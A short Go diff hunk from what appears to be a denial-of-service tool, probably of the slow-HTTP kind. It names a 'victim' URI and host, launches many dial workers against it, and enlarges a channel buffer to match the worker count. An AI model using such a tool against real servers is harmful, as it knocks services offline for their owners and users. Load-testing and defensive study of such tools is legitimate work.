@@ -86,7 +86,7 @@ func main() {
 		victimUri.RequestURI(), victimUri.Host, *contentLength))
 
 	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
-	activeConnectionsCh := make(chan int, 10)
+	activeConnectionsCh := make(chan int, *dialWorkersCount)
 	go activeConnectionsCounter(activeConnectionsCh)
 	for i := 0; i < *dialWorkersCount; i++ {
 		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
